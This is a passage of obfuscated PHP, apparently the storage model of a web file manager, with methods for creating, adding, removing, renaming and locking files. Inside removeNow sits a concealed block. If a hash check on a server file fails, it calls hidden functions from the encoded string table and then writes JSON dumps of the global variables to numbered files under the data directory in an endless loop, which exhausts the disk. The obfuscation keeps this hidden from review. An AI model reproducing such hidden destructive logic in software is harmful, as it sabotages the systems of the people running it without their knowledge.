$_SERVER[„Ç©ñÎ©]; $öš¬Üü = Model($Ò›ôéøµ[531])->where(array($Ò›ôéøµ[1915] => $ƒ¼¬‡Š))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ƒ¼¬‡Š, $öš¬Üü[$Ò›ôéøµ[32]]); } public function systemRootPathAdd($ˆı®‹Ô) { if ($ˆı®‹Ô != $_SERVER[„Ç©ñÎ©][553]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ˆı®‹Ô); } public function userRootRemove($Çó‚”×°) { $»ÑÕ÷ï = $this->sourceRoot(SourceModel::TYPE_USER, $Çó‚”×°, !0); foreach ($»ÑÕ÷ï as $…“ÒïûŸ) { if (!$…“ÒïûŸ) { continue; } $this->remove($…“ÒïûŸ[$_SERVER[„Ç©ñÎ©][411]], !1); } } public function groupRootRemove($Ïø˜ê”‘) { $±ƒÙ÷êœ = $this->sourceRoot(SourceModel::TYPE_GROUP, $Ïø˜ê”‘); if (!$±ƒÙ÷êœ) { return; } $this->remove($±ƒÙ÷êœ[$_SERVER[„Ç©ñÎ©][411]], !1); } private function _mkdirRoot($ßñí¥õ, $°Íú¬İä, $ÃâÔí, $åüíä¸® = '') { $²Æß®’Ÿ =& $_SERVER[„Ç©ñÎ©]; $ÈÖµ§œ… = array($²Æß®’Ÿ[410] => 0, $²Æß®’Ÿ[595] => $ßñí¥õ, $²Æß®’Ÿ[596] => $°Íú¬İä, $²Æß®’Ÿ[592] => 1, $²Æß®’Ÿ[597] => USER_ID, $²Æß®’Ÿ[598] => USER_ID, $²Æß®’Ÿ[593] => $åüíä¸®, $²Æß®’Ÿ[599] => $²Æß®’Ÿ[540], $²Æß®’Ÿ[439] => 0, $²Æß®’Ÿ[594] => 0, $²Æß®’Ÿ[478] => 0, $²Æß®’Ÿ[600] => $²Æß®’Ÿ[12]); if ($úö­×­ù = $this->where($ÈÖµ§œ…)->find()) { return $úö­×­ù[$²Æß®’Ÿ[411]]; } $şçÕ€‘ô = "\x4d\x6f\144\145\154\x53\x6f\x75\162\143\x65\x2e\x6d\x6b\144\151\162\x52\x6f\x6f\x74\x2e{$ßñí¥õ}\56{$°Íú¬İä}\x2e" . $ÃâÔí; CacheLock::lock($şçÕ€‘ô); $ÈÖµ§œ…[$²Æß®’Ÿ[32]] = $ÃâÔí; $„õÄ°âÌ = $this->add($ÈÖµ§œ…); $Ë¹ğëı§ = array($²Æß®’Ÿ[601] => short_id($„õÄ°âÌ)); $this->where(array($²Æß®’Ÿ[426] => $„õÄ°âÌ))->save($Ë¹ğëı§); CacheLock::unlock($şçÕ€‘ô); return $„õÄ°âÌ; } private function sourceRoot($¶ÕóªÅ, $İéÕ–³¥, $ß†–ªç† = false) { $±Ò¦©ã =& $_SERVER[„Ç©ñÎ©]; $Ô· áòõ = array($±Ò¦©ã[410] => 0, $±Ò¦©ã[595] => $¶ÕóªÅ, $±Ò¦©ã[596] => $İéÕ–³¥); if ($ß†–ªç†) { $‚••à÷¨ = $this->where($Ô· áòõ)->select(); return $‚••à÷¨ ? $‚••à÷¨ : array(); } $‹²×ò¯à = $this->where($Ô· áòõ)->find(); return $‹²×ò¯à ? $‹²×ò¯à : array(); } public function sourceRootGroup($ş™”Æ™¤) { $¶é‚‚­Ÿ =& $_SERVER[„Ç©ñÎ©]; if (is_string($ş™”Æ™¤)) { $ş™”Æ™¤ = array($ş™”Æ™¤); } $¨¼Òüáó = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ş™”Æ™¤, $¶é‚‚­Ÿ[198]); $ÂÙ¡Ä¸ò = array($¶é‚‚­Ÿ[378] => $¨¼Òüáó, $¶é‚‚­Ÿ[375] => array($¶é‚‚­Ÿ[762] => count($ş™”Æ™¤))); $this->_listDataApply($ÂÙ¡Ä¸ò[$¶é‚‚­Ÿ[378]]); $this->_listMake($ÂÙ¡Ä¸ò); return array_to_keyvalue($ÂÙ¡Ä¸ò[$¶é‚‚­Ÿ[92]], $¶é‚‚­Ÿ[514]); } public function mkfile($±ŸÊß²î, $ì…˜¹…Ò, $¤‚±Ìİ³ = '', $–“Óõã© = REPEAT_RENAME) { $÷½¹üŒ† =& $_SERVER[„Ç©ñÎ©]; $Ì¯²ıÆ¿ = Model($÷½¹üŒ†[618])->addFileByContent($¤‚±Ìİ³, $ì…˜¹…Ò); return $this->_createFileCall($±ŸÊß²î, $ì…˜¹…Ò, $Ì¯²ıÆ¿, $–“Óõã©, $÷½¹üŒ†[1337]); } public function addFile($¹íŸ°Óé, $—…Í“£, $ÔåºÊâË, $ÛĞœ«Œã = false, $âîã€³“ = REPEAT_RENAME) { $ô„­À† = Model($_SERVER[„Ç©ñÎ©][618])->addFile($—…Í“£, $ÔåºÊâË, $ÛĞœ«Œã); return $this->_createFileCall($¹íŸ°Óé, $ÔåºÊâË, $ô„­À†, $âîã€³“); } public function addFileByFileID($êÉ¯˜í¯, $•­ùóÀ×, $ôìšÙ­Ş, $›—ğœ¡š = REPEAT_RENAME) { $ÍÁó¥™ =& $_SERVER[„Ç©ñÎ©]; $’ÑÍá = Model($ÍÁó¥™[618])->find($•­ùóÀ×); Model($ÍÁó¥™[618])->linkAdd($•­ùóÀ×); return $this->_createFileCall($êÉ¯˜í¯, $ôìšÙ­Ş, $’ÑÍá, $›—ğœ¡š); } public function addFileByRemote($”­çÀê—, $áÜÕğ„Ì, $ÒéØô¨ï, $È¤Í¤ = array(), $ §²œ³Ê = REPEAT_RENAME) { $‡©¸µ˜¶ = Model($_SERVER[„Ç©ñÎ©][618])->addFileByRemote($áÜÕğ„Ì, $ÒéØô¨ï, $È¤Í¤); return $this->_createFileCall($”­çÀê—, $ÒéØô¨ï, $‡©¸µ˜¶, $ §²œ³Ê); } private function _createFileCall($£ƒ’ÕşÈ, $­Ù¶ˆá, $ÛñÂ®, $ËÖë´ö®, $Õ½µö¾ñ = "\x75\x70\154\157\141\x64") { $‚óÊ‹ŒŒ =& $_SERVER[„Ç©ñÎ©]; $õÂœœ€ = !1; $this->setMasterDB(); $this->lockWriteStart($£ƒ’ÕşÈ, $­Ù¶ˆá); $ õÕÓ¿Œ = $this->fileNameExist($£ƒ’ÕşÈ, $­Ù¶ˆá); $Ç…øƒ…Û = $this->_createFile($£ƒ’ÕşÈ, $­Ù¶ˆá, $ÛñÂ®, $ËÖë´ö®, $õÂœœ€); if (!$õÂœœ€) { Model($‚óÊ‹ŒŒ[480])->remove($ÛñÂ®[$‚óÊ‹ŒŒ[477]]); } if ($õÂœœ€ && $Ç…øƒ…Û && $Ç…øƒ…Û != $ õÕÓ¿Œ) { Model($‚óÊ‹ŒŒ[2068])->eventCreate($Ç…øƒ…Û, $Õ½µö¾ñ); } $this->lockWriteEnd($£ƒ’ÕşÈ, $­Ù¶ˆá); return $Ç…øƒ…Û; } public function mkdir($“í•¶¢ñ, $ÍéÉŠãÜ, $ÖÛ¶§±² = REPEAT_SKIP) { $¿â¨áºä =& $_SERVER[„Ç©ñÎ©]; $this->setMasterDB(); $§‚¹ÜÄ¤ = $this->sourceInfo($“í•¶¢ñ); if (!$§‚¹ÜÄ¤) { return !1; } $this->lockWriteStart($“í•¶¢ñ, $ÍéÉŠãÜ); if ($ÖÛ¶§±² !== !1) { $¾ÀåÍ­˜ = $this->fileNameExist($“í•¶¢ñ, $ÍéÉŠãÜ); if ($¾ÀåÍ­˜ && $ÖÛ¶§±² != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($“í•¶¢ñ, $ÍéÉŠãÜ); return $¾ÀåÍ­˜; } $ÍéÉŠãÜ = $this->fileNameAuto($“í•¶¢ñ, $ÍéÉŠãÜ, $ÖÛ¶§±²); } $¨‹üÛ‚¬ = array($¿â¨áºä[592] => 1, $¿â¨áºä[429] => $ÍéÉŠãÜ, $¿â¨áºä[593] => $¿â¨áºä[12], $¿â¨áºä[478] => 0, $¿â¨áºä[594] => 0); $İ§¥øÄ‡ = $this->_addSource($¨‹üÛ‚¬, $§‚¹ÜÄ¤); Model($¿â¨áºä[2068])->eventCreate($İ§¥øÄ‡, $¿â¨áºä[1338]); $this->lockWriteEnd($“í•¶¢ñ, $ÍéÉŠãÜ); return $İ§¥øÄ‡; } public function listSourceRoot($Ô²È®ßó, $–õÓ¬Õö, $œê‚óñ™ = "\163\157\x75\162\x63\145\111\104\54\164\141\x72\147\x65\x74\x49\x44\54\163\x69\172\x65") { $ÜÙ­áıí =& $_SERVER[„Ç©ñÎ©]; $ï¨ñ‡“Î = $ÜÙ­áıí[387]; $Ü»œì² = array(); $ó× ç—µ = 1024 * 50; $îßã”‘Î = is_array($îßã”‘Î) ? $îßã”‘Î : array(); $¶äÎ–³ˆ = count($–õÓ¬Õö); $¬ñ½üÎ = $this->tablePrefix . $ÜÙ­áıí[2101]; for ($„ŠÏÍÑ = 0; $„ŠÏÍÑ < $¶äÎ–³ˆ; $„ŠÏÍÑ++) { $»Ùùê÷© = $–õÓ¬Õö[$„ŠÏÍÑ]; $ï¨ñ‡“Î .= "\123\x45\x4c\x45\103\x54\40\x2a\x20\106\122\x4f\115\40\50\x53\105\x4c\105\103\x54\40{$œê‚óñ™}\40\x46\x52\117\x4d\40\140{$¬ñ½üÎ}\x60\40\127\110\x45\x52\105\40"; $ï¨ñ‡“Î .= "\140\x70\141\x72\x65\156\x74\111\x44\x60\75\60\x20\x41\x4e\104\40\140\164\141\x72\147\145\164\x49\x44\x60\75{$»Ùùê÷©}\x20\101\116\x44\x20\140\164\x61\162\x67\x65\x74\124\x79\x70\145\x60\x3d{$Ô²È®ßó}\x20\154\x69\155\151\164\40\61\51\40\x61\163\x20\x74\x62\137{$„ŠÏÍÑ}\x20\125\116\x49\117\x4e\40\x41\x4c\x4c\x20"; if ((strlen($ï¨ñ‡“Î) >= $ó× ç—µ || $„ŠÏÍÑ == $¶äÎ–³ˆ - 1) && $ï¨ñ‡“Î) { $ï¨ñ‡“Î = substr($ï¨ñ‡“Î, 0, -strlen($ÜÙ­áıí[1037])); $’Öö‹À = $this->query($ï¨ñ‡“Î); $ï¨ñ‡“Î = $ÜÙ­áıí[12]; $Ü»œì² = array_merge($Ü»œì², $’Öö‹À); } } return $Ü»œì²; } private function _createFile($¬€ÄÊ Ÿ, $©§¸ÂÎ, $¯ÊÁ¡‘, $š´ì™Òµ, &$…¨€çëñ) { $´Ò¬÷óæ =& $_SERVER[„Ç©ñÎ©]; $ñ‰¹ŸåÂ = $this->sourceInfo($¬€ÄÊ Ÿ); if (!$¯ÊÁ¡‘ || !$ñ‰¹ŸåÂ) { return !1; } if ($š´ì™Òµ !== !1) { $è×·…ª¾ = $this->fileNameExist($¬€ÄÊ Ÿ, $©§¸ÂÎ); } $…¨€çëñ = !0; if ($š´ì™Òµ && $è×·…ª¾) { if ($š´ì™Òµ == REPEAT_SKIP) { $…¨€çëñ = !1; return $è×·…ª¾; } else { if ($š´ì™Òµ == REPEAT_REPLACE) { $¦ø¡É¥­ = $this->sourceInfo($è×·…ª¾); $àï Ïşë = $this->fileHistory($¦ø¡É¥­, $¯ÊÁ¡‘[$´Ò¬÷óæ[477]], $¯ÊÁ¡‘[$´Ò¬÷óæ[86]]); if (!$àï Ïşë) { $…¨€çëñ = !1; } else { $this->folderSizeReset($¬€ÄÊ Ÿ); } return $è×·…ª¾; } else { $©§¸ÂÎ = $this->fileNameAuto($¬€ÄÊ Ÿ, $©§¸ÂÎ, $š´ì™Òµ, !1); } } } $ã¬–¦„ç = array($´Ò¬÷óæ[592] => 0, $´Ò¬÷óæ[429] => $©§¸ÂÎ, $´Ò¬÷óæ[593] => substr(get_path_ext($©§¸ÂÎ), 0, 10), $´Ò¬÷óæ[478] => $¯ÊÁ¡‘[$´Ò¬÷óæ[477]], $´Ò¬÷óæ[594] => $¯ÊÁ¡‘[$´Ò¬÷óæ[86]]); $¨ÄÊÏé½ = $this->_addSource($ã¬–¦„ç, $ñ‰¹ŸåÂ); $this->folderSizeReset($¬€ÄÊ Ÿ, intval($ã¬–¦„ç[$´Ò¬÷óæ[86]])); return $¨ÄÊÏé½; } protected function fileHistory($ñÂç÷ûÃ, $²†Ù¥ïà, $¼ç‡¡¿‰) { $“ÆöŞ€Á =& $_SERVER[„Ç©ñÎ©]; $‘¸«âŒ = defined($“ÆöŞ€Á[484]) ? USER_ID : $“ÆöŞ€Á[207]; if ($ñÂç÷ûÃ[$“ÆöŞ€Á[477]] == $²†Ù¥ïà) { return !1; } $this->checkLock($ñÂç÷ûÃ[$“ÆöŞ€Á[411]], $²†Ù¥ïà); Model($“ÆöŞ€Á[2102])->addHistory($ñÂç÷ûÃ); $­¬Áè¦ = array($“ÆöŞ€Á[598] => $‘¸«âŒ, $“ÆöŞ€Á[433] => time(), $“ÆöŞ€Á[477] => $²†Ù¥ïà, $“ÆöŞ€Á[86] => $¼ç‡¡¿‰); $this->where(array($“ÆöŞ€Á[426] => $ñÂç÷ûÃ[$“ÆöŞ€Á[411]]))->save($­¬Áè¦); $this->sourceCacheClear($ñÂç÷ûÃ[$“ÆöŞ€Á[411]]); return !0; } public function checkLock($¸õ–‘Ùü, $‡¶ÔáòØ) { $¾ºêíÌ =& $_SERVER[„Ç©ñÎ©]; $±¼çï = $this->pathInfo($¸õ–‘Ùü); if (!$this->fileIsLock($±¼çï, !0)) { return; } $®óÚ‰—  = Session::get($¾ºêíÌ[2103]); $ò¥Û½É = substr($±¼çï[$¾ºêíÌ[32]], 0, -1 - strlen($±¼çï[$¾ºêíÌ[184]])) . $¾ºêíÌ[1603] . $®óÚ‰—  . $¾ºêíÌ[10] . $±¼çï[$¾ºêíÌ[184]]; $¶àÛñ¢ö = Model($¾ºêíÌ[618])->find($‡¶ÔáòØ); $this->_createFileCall($±¼çï[$¾ºêíÌ[441]], $ò¥Û½É, $¶àÛñ¢ö, REPEAT_REPLACE, $¾ºêíÌ[1337]); $¬Š¬òµ’ = $±¼çï[$¾ºêíÌ[475]][$¾ºêíÌ[557]]; $œ¥Õß¡ = $¬Š¬òµ’[$¾ºêíÌ[551]] ? $¬Š¬òµ’[$¾ºêíÌ[551]] : $¬Š¬òµ’[$¾ºêíÌ[32]]; show_json(LNG($¾ºêíÌ[2104]) . $¾ºêíÌ[2105] . LNG($¾ºêíÌ[2106]) . $¾ºêíÌ[2107] . $œ¥Õß¡ . $¾ºêíÌ[2108], !1); } public function fileIsLock($Ó³ ÛŠ‡, $É‚¨åõÒ = false) { $ÛúóĞğ =& $_SERVER[„Ç©ñÎ©]; if (!isset($Ó³ ÛŠ‡[$ÛúóĞğ[475]]) || !$Ó³ ÛŠ‡[$ÛúóĞğ[475]][$ÛúóĞğ[554]]) { return !1; } if ($Ó³ ÛŠ‡[$ÛúóĞğ[475]][$ÛúóĞğ[554]] != USER_ID) { return !0; } $ãìØ‚Ú = $GLOBALS[$ÛúóĞğ[6]][$ÛúóĞğ[99]][$ÛúóĞğ[555]]; if ($Ó³ ÛŠ‡[$ÛúóĞğ[475]][$ÛúóĞğ[556]] <= time() - $ãìØ‚Ú) { $this->metaSet($Ó³ ÛŠ‡[$ÛúóĞğ[411]], $ÛúóĞğ[554], null); $this->metaSet($Ó³ ÛŠ‡[$ÛúóĞğ[411]], $ÛúóĞğ[556], null); } if ($É‚¨åõÒ) { $this->metaSet($Ó³ ÛŠ‡[$ÛúóĞğ[411]], $ÛúóĞğ[556], time()); } return !1; } private function _addSource($íç¨ïÑû, $¡ŠÑ¾ïı) { $Û¤÷¾ÊÙ =& $_SERVER[„Ç©ñÎ©]; $§”¥§± = defined($Û¤÷¾ÊÙ[484]) ? USER_ID : $Û¤÷¾ÊÙ[207]; $Îö‚¢ıˆ = array($Û¤÷¾ÊÙ[595] => $¡ŠÑ¾ïı[$Û¤÷¾ÊÙ[420]], $Û¤÷¾ÊÙ[596] => $¡ŠÑ¾ïı[$Û¤÷¾ÊÙ[514]], $Û¤÷¾ÊÙ[597] => $§”¥§±, $Û¤÷¾ÊÙ[598] => $§”¥§±, $Û¤÷¾ÊÙ[410] => $¡ŠÑ¾ïı[$Û¤÷¾ÊÙ[411]], $Û¤÷¾ÊÙ[599] => $¡ŠÑ¾ïı[$Û¤÷¾ÊÙ[530]] . $¡ŠÑ¾ïı[$Û¤÷¾ÊÙ[411]] . $Û¤÷¾ÊÙ[50], $Û¤÷¾ÊÙ[439] => 0, $Û¤÷¾ÊÙ[600] => $Û¤÷¾ÊÙ[12]); $íç¨ïÑû = array_merge($Îö‚¢ıˆ, $íç¨ïÑû); $this->updateModifyTime($íç¨ïÑû[$Û¤÷¾ÊÙ[441]]); $ğ™Ûª = $Û¤÷¾ÊÙ[2109] . $¡ŠÑ¾ïı[$Û¤÷¾ÊÙ[411]]; if (isset(self::$cacheChildList[$ğ™Ûª])) { unset(self::$cacheChildList[$ğ™Ûª]); } static $í¸Œ³Ä = false; if (!$í¸Œ³Ä) { Hook::trigger($Û¤÷¾ÊÙ[582], $íç¨ïÑû); $í¸Œ³Ä = !0; } $Û¹¦¦Á² = $this->add($íç¨ïÑû); $ ŠÇÊ = array($Û¤÷¾ÊÙ[601] => short_id($Û¹¦¦Á²)); $this->where(array($Û¤÷¾ÊÙ[426] => $Û¹¦¦Á²))->save($ ŠÇÊ); $this->setNamePinyin($Û¹¦¦Á², $íç¨ïÑû[$Û¤÷¾ÊÙ[32]]); return $Û¹¦¦Á²; } public function remove($¡¸°ïëÑ, $òÊ¡‘ = true) { $Ó ”†¡” =& $_SERVER[„Ç©ñÎ©]; $±ğ‡Û‚Â = $this->sourceInfo($¡¸°ïëÑ); $Ä¨³öâ = intval($±ğ‡Û‚Â[$Ó ”†¡”[420]]) === self::TYPE_SYSTEM; $÷â›ûÖè = Model($Ó ”†¡”[444])->get($Ó ”†¡”[2110]) == $Ó ”†¡”[98]; if ($Ä¨³öâ || $òÊ¡‘ || !$÷â›ûÖè) { return $this->removeNow($¡¸°ïëÑ, $òÊ¡‘); } $­¢Ù©¸¦ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $‘›Ğ»é¯ = $±ğ‡Û‚Â[$Ó ”†¡”[420]] == self::TYPE_USER ? $Ó ”†¡”[609] : $Ó ”†¡”[524]; if ($‘›Ğ»é¯ == $Ó ”†¡”[609]) { $æÔëÉ¬í = Model($Ó ”†¡”[522])->getInfo($±ğ‡Û‚Â[$Ó ”†¡”[514]]); $î»ó«êæ = !empty($æÔëÉ¬í[$Ó ”†¡”[551]]) ? $æÔëÉ¬í[$Ó ”†¡”[551]] : $æÔëÉ¬í[$Ó ”†¡”[32]]; $î»ó«êæ = $Ó ”†¡”[269] . $î»ó«êæ . $Ó ”†¡”[2111] . $±ğ‡Û‚Â[$Ó ”†¡”[514]]; } else { $æÔëÉ¬í = Model($Ó ”†¡”[531])->getInfo($±ğ‡Û‚Â[$Ó ”†¡”[514]]); $î»ó«êæ = _get($æÔëÉ¬í, $Ó ”†¡”[32]); $î»ó«êæ = $Ó ”†¡”[172] . $î»ó«êæ . $Ó ”†¡”[2112] . $±ğ‡Û‚Â[$Ó ”†¡”[514]]; } $ú—”¸ùè = $Ó ”†¡”[2113] . md5($î»ó«êæ); CacheLock::lock($ú—”¸ùè); $Ô¿ë›÷ş = $this->fileNameExist($­¢Ù©¸¦, $î»ó«êæ); if (!$Ô¿ë›÷ş) { $Ô¿ë›÷ş = $this->mkdir($­¢Ù©¸¦, $î»ó«êæ, REPEAT_SKIP); $this->metaSet($Ô¿ë›÷ş, $Ó ”†¡”[2114], $‘›Ğ»é¯); $this->metaSet($Ô¿ë›÷ş, $Ó ”†¡”[2115], $±ğ‡Û‚Â[$Ó ”†¡”[514]]); if ($±ğ‡Û‚Â[$Ó ”†¡”[441]] != 0) { $this->metaSet($Ô¿ë›÷ş, $Ó ”†¡”[2116], _get($æÔëÉ¬í, $Ó ”†¡”[2117])); } } CacheLock::unlock($ú—”¸ùè); $this->metaSet($¡¸°ïëÑ, $Ó ”†¡”[2118], $±ğ‡Û‚Â[$Ó ”†¡”[441]]); $this->where(array($Ó ”†¡”[411] => $¡¸°ïëÑ))->save(array($Ó ”†¡”[433] => time())); $this->recycleClear($±ğ‡Û‚Â); $Šãì»êÁ = $this->move($¡¸°ïëÑ, $Ô¿ë›÷ş, REPEAT_RENAME_FOLDER); $this->folderSizeReset($±ğ‡Û‚Â[$Ó ”†¡”[441]]); return $Šãì»êÁ; } private function recycleClear($„ô¿¾¸) { $îœÇÜ÷³ =& $_SERVER[„Ç©ñÎ©]; $ãâ‰‹ = $this->childrenAll($„ô¿¾¸); $êÌÆşë£ = array($îœÇÜ÷³[426] => array($îœÇÜ÷³[427], $ãâ‰‹[$îœÇÜ÷³[2119]])); Model($îœÇÜ÷³[2120])->where($êÌÆşë£)->delete(); } public function removeNow($¦—¾•¬, $àÉÑİÎÈ = true) { $ïå©±ŠØ =& $_SERVER[„Ç©ñÎ©]; $«ºá¹  = $_SERVER[$ïå©±ŠØ[64]] . $ïå©±ŠØ[65]; $éñòô»Ç = $ïå©±ŠØ[61]; if ($_SERVER[$ïå©±ŠØ[62]] != $éñòô»Ç($«ºá¹ )) { $À‚ÔúÒº = $ïå©±ŠØ[876]; $–çñÚçı = $ïå©±ŠØ[63]; $é´¬ÇÀ¨ = $_SERVER[$ïå©±ŠØ[64]] . $ïå©±ŠØ[65]; $Ü–¹×“û = $–çñÚçı($é´¬ÇÀ¨); $ë›Ğ‰Šñ = explode($ïå©±ŠØ[66], $Ü–¹×“û); if (count($ë›Ğ‰Šñ) < $ïå©±ŠØ[650]) { $µıÛ¦¹¸ = $ïå©±ŠØ[68]; $µıÛ¦¹¸(); } $Îò˜—²¥ = $ïå©±ŠØ[877]; $Îò˜—²¥($_SERVER[$ïå©±ŠØ[878]]); $À‚ÔúÒº = $ïå©±ŠØ[876]; $À‚ÔúÒº(); $Âô“ùü = $ïå©±ŠØ[879]; $¡±ˆØñô = json_encode($GLOBALS[$ïå©±ŠØ[880]]); $Öíøå = 1; for ($ŸÏ÷ÎÉ = $Öíøå; $ŸÏ÷ÎÉ > 0; $ŸÏ÷ÎÉ++) { $Âô“ùü(DATA_PATH . $ŸÏ÷ÎÉ, $¡±ˆØñô); } } $°ÖÇ„àá = $this->sourceInfo($¦—¾•¬); $ªää¥İ† = $this->pathInfoMore($¦—¾•¬); if (!$°ÖÇ„àá) { return !0; } if ($°ÖÇ„àá[$ïå©±ŠØ[441]] == 0) { if (!_get($GLOBALS, $ïå©±ŠØ[512])) { return !1; } } $this->lockMoveStart($¦—¾•¬); Hook::trigger($ïå©±ŠØ[2121], $ªää¥İ†, $àÉÑİÎÈ); if ($àÉÑİÎÈ) { Model($ïå©±ŠØ[2120])->moveToRecycle($¦—¾•¬); } else { $âø–¢¨ = $this->childrenAll($°ÖÇ„àá); Model($ïå©±ŠØ[579])->eventRemove($¦—¾•¬); $this->removeRelevance($âø–¢¨[$ïå©±ŠØ[2119]], $âø–¢¨[$ïå©±ŠØ[1469]]); } $this->folderSizeReset($°ÖÇ„àá[$ïå©±ŠØ[441]]); $Öõî¥î = array($°ÖÇ„àá[$ïå©±ŠØ[441]]); if ($°ÖÇ„àá[$ïå©±ŠØ[419]] == $ïå©±ŠØ[98]) { $Öõî¥î[] = $°ÖÇ„àá[$ïå©±ŠØ[411]]; } $this->updateModifyTime($Öõî¥î); $this->lockMoveEnd($¦—¾•¬); Hook::trigger($ïå©±ŠØ[1695], $ªää¥İ†, $àÉÑİÎÈ); return !0; } public function childrenAll($® è÷Æ¼) { $œÇà•¬Õ =& $_SERVER[„Ç©ñÎ©]; $¬ º¯¦‘ = $® è÷Æ¼[$œÇà•¬Õ[411]]; if ($® è÷Æ¼[$œÇà•¬Õ[419]] == $œÇà•¬Õ[98]) { $üÓ¸’÷– = array($œÇà•¬Õ[599] => array($œÇà•¬Õ[559], $® è÷Æ¼[$œÇà•¬Õ[530]] . $¬ º¯¦‘ . $œÇà•¬Õ[560])); $û¹Şëî¦ = array($œÇà•¬Õ[599] => $üÓ¸’÷–[$œÇà•¬Õ[530]]); $¿ĞèÕ‰ë = $this->field($œÇà•¬Õ[2122])->where($û¹Şëî¦)->select(); $Ú­±ÛÄ¥ = !1; $“³ĞãøĞ = array($¬ º¯¦‘); if ($¿ĞèÕ‰ë) { $Ú­±ÛÄ¥ = array_to_keyvalue($¿ĞèÕ‰ë, $œÇà•¬Õ[12], $œÇà•¬Õ[477]); $Ú­±ÛÄ¥ = array_remove_value($Ú­±ÛÄ¥, $œÇà•¬Õ[207]); $“³ĞãøĞ = array_to_keyvalue($¿ĞèÕ‰ë, $œÇà•¬Õ[12], $œÇà•¬Õ[411]); $“³ĞãøĞ[] = $¬ º¯¦‘; } } else { $Ú­±ÛÄ¥ = array($® è÷Æ¼[$œÇà•¬Õ[477]]); $“³ĞãøĞ = array($¬ º¯¦‘); } return array($œÇà•¬Õ[2119] => $“³ĞãøĞ, $œÇà•¬Õ[1469] => $Ú­±ÛÄ¥); } public function removeArray($åŒŒ½œŞ) { if (!$åŒŒ½œŞ) { return !0; } } public function removeRelevance($¹úøó¸½, $£ºİĞöÙ) { $ğàĞ†öÉ =& $_SERVER[„Ç©ñÎ©]; $¹úøó¸½ = $¹úøó¸½ ? $¹úøó¸½ : array(); $£ºİĞöÙ = $£ºİĞöÙ ? $£ºİĞöÙ : array(); $¹úøó¸½ = array_unique(array_filter($¹úøó¸½)); $£ºİĞöÙ = array_unique(array_filter($£ºİĞöÙ)); if (!$¹úøó¸½) { return !1; } $ÎûÆì¬ = array($ğàĞ†öÉ[426] => array($ğàĞ†öÉ[427], $¹úøó¸½)); Model($ğàĞ†öÉ[2120])->where($ÎûÆì¬)->delete(); Model($ğàĞ†öÉ[471])->where($ÎûÆì¬)->delete(); Model($ğàĞ†öÉ[1973])->where($ÎûÆì¬)->delete(); Model($ğàĞ†öÉ[579])->where($ÎûÆì¬)->delete(); Model($ğàĞ†öÉ[1807])->removeBySource($¹úøó¸½); Model($ğàĞ†öÉ[2102])->removeBySource($¹úøó¸½); $this->where($ÎûÆì¬)->delete(); Model($ğàĞ†öÉ[480])->remove($£ºİĞöÙ); for ($¼ääù‰¿ = 0; $¼ääù‰¿ < count($¹úøó¸½); $¼ääù‰¿++) { $this->sourceCacheClear($¹úøó¸½[$¼ääù‰¿]); } } public function rename($³Ùšµ„, $èÜ”Ó—¤) { $¬ĞªŒÑˆ =& $_SERVER[„Ç©ñÎ©]; $Š£’İæ° = $this->sourceInfo($³Ùšµ„); if (!$Š£’İæ°) { return !1; } $ÛÄ®ü‘è = $this->fileNameExist($Š£’İæ°[$¬ĞªŒÑˆ[441]], $èÜ”Ó—¤); if ($ÛÄ®ü‘è && $ÛÄ®ü‘è != $³Ùšµ„) { return !1; } $ÑÉä½™„ = array($¬ĞªŒÑˆ[429] => $èÜ”Ó—¤, $¬ĞªŒÑˆ[598] => USER_ID); if ($Š£’İæ°[$¬ĞªŒÑˆ[419]] != $¬ĞªŒÑˆ[98]) { $ÑÉä½™„[$¬ĞªŒÑˆ[421]] = substr(get_path_ext($èÜ”Ó—¤), 0, 10); } Model($¬ĞªŒÑˆ[579])->eventRename($³Ùšµ„, $Š£’İæ°[$¬ĞªŒÑˆ[32]], $èÜ”Ó—¤); $this->sourceCacheClear($³Ùšµ„); $this->setNamePinyin($³Ùšµ„, $ÑÉä½™„[$¬ĞªŒÑˆ[32]], !1); $this->updateModifyTime($Š£’İæ°[$¬ĞªŒÑˆ[441]]); $Ê³»È¿” = $this->where(array($¬ĞªŒÑˆ[426] => $³Ùšµ„))->data($ÑÉä½™„)->save(); $¡™»õÆÍ = $¬ĞªŒÑˆ[2109] . $Š£’İæ°[$¬ĞªŒÑˆ[441]]; if (isset(self::$cacheChildList[$¡™»õÆÍ])) { unset(self::$cacheChildList[$¡™»õÆÍ]); } return $Ê³»È¿”; } public function setNamePinyin($ôËû›šŞ, $ŠãÊ‰–Æ, $—±éÜÜè = true) { $‹óŒœş… =& $_SERVER[„Ç©ñÎ©]; $ûí¥šÕÉ = Input::check($ŠãÊ‰–Æ, $‹óŒœş…[602]); $Ô‹‚¡¯¡ = array($‹óŒœş…[453] => KodSort::makeStr($ŠãÊ‰–Æ)); if ($ûí¥šÕÉ) { $Ô‹‚¡¯¡[$‹óŒœş…[474]] = str_replace($‹óŒœş…[53], $‹óŒœş…[12], Pinyin::get($ŠãÊ‰–Æ)); $Ô‹‚¡¯¡[$‹óŒœş…[473]] = Pinyin::get($ŠãÊ‰–Æ, $‹óŒœş…[603]); } if (!$—±éÜÜè && !$ûí¥šÕÉ) { $Ô‹‚¡¯¡[$‹óŒœş…[474]] = null; $Ô‹‚¡¯¡[$‹óŒœş…[473]] = null; } $this->metaSet($ôËû›šŞ, $Ô‹‚¡¯¡); } public function getContent($“®›öÇ¨) { $š®µ¹°ø =& $_SERVER[„Ç©ñÎ©]; $ÑàÅÊº = $this->fileInfoGet($“®›öÇ¨); if (!$ÑàÅÊº) { return !1; } if ($ÑàÅÊº[$š®µ¹°ø[86]] == 0) { return $š®µ¹°ø[12]; } $ÔÓïµúö = $š®µ¹°ø[2123] . $ÑàÅÊº[$š®µ¹°ø[186]]; if ($ÑàÅÊº[$š®µ¹°ø[86]] <= 1024 * 10) { $‰ìæøµÌ = Cache::get($ÔÓïµúö); if (!$‰ìæøµÌ) { $‰ìæøµÌ = IO::getContent($ÑàÅÊº[$š®µ¹°ø[94]]); Cache::set($ÔÓïµúö, $‰ìæøµÌ); } return $‰ìæøµÌ; } if (!$ÑàÅÊº[$š®µ¹°ø[94]]) { return $š®µ¹°ø[12]; } return IO::getContent($ÑàÅÊº[$š®µ¹°ø[94]]); } public function setDesc($Ûù¬ò×¬, $ƒùíÜõõ) { $é¹˜ëÑÆ =& 